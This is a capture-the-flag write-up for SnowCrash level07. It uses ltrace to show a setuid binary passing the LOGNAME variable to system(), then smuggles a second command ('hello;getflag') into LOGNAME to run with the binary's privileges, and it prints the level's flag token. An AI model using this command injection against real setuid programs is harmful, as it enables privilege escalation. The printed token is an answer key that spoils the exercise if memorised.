After loggin to level07 we find a suid binary file called level07 in the home folder

When executing ltrace we find that the program calls for getenv taking the value of LOGNAME env variable

And executing echo with the value as follow

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                = 2007
geteuid()                                                = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
getenv("LOGNAME")                                        = "hello;whoami"
asprintf(0xbffff704, 0x8048688, 0xbfffff4b, 0xb7e5ee55, 0xb7fed280) = 23
system("/bin/echo hello;whoami "hello
level07
<unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++
```

Let's try and inject getflag command to the LOGNAME env variable, so when the binary try to execute /bin/echo $LOGNAME it gives us the flag

```
level07@SnowCrash:~$ LOGNAME='hello;whoami'
level07@SnowCrash:~$ ./level07
hello
flag07
level07@SnowCrash:~$ LOGNAME='hello;getflag'
level07@SnowCrash:~$ ./level07
hello
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```
